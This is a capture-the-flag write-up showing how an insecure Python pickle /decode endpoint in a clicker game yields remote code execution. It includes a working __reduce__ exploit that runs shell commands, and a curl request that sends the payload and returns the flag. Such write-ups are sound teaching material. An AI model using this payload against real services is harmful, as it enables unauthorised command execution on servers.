# apple-clicker write-up

> My mom said cookies are bad for me, so I am not allowed to play Cookie Clicker anymore.
>
> Luckily, I found a game called Apple Clicker, which is equally fun, and much healthier!

When opening the challenge, we find a very simple game. Click the apple, and a counter increases. We do notice that game state is saved between refreshes. There seems to be a cryptic `gameState` flag in `localStorage`, and a call to `/encode` happens for every click. On first page load, we see a call to `/decode`.

Inspecting the requests and the code a bit better, we find that it is referred to as a "pickle". It is easy to find that `pickle` is a Python (de)serialization module. The [documentation](https://docs.python.org/3/library/pickle.html) states in a red banner:

> Warning: The pickle module is not secure. Only unpickle data you trust.

That seems promising!

It turns out that the `pickle` module allows us to get remote code execution. There are many blog posts and tutorials about this, this write-up is based on [David Hamann's explanation](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).

Sadly, the CTF network is not set up to get a shell in the same way as this blog post describes (reverse connections from the CTF machine to the contestants are not allowed by the firewall). We need to find another solution. A simple alternative is by using `subprocess.getoutput`. We can first run `ls` to find the file `flag`, then `cat` it to get the solution.

```python
import pickle
import base64
import subprocess


class RCE:
    def __reduce__(self):
        # First use `ls` to look around on the server and find the file 'flag'
        # cmd = 'ls'
        cmd = 'cat flag'
        return subprocess.getoutput, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled))
```

Running this gives us a base64 value, which we can just send with cURL instead of the browser, directly giving us the flag.

```bash
$ curl -X POST http://<IP>/decode -d '{"pickle": "gASVKwAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMCGNhdCBmbGFnlIWUUpQu"}' -H 'Content-Type: application/json'
{"state":"flg{1234}"}
```
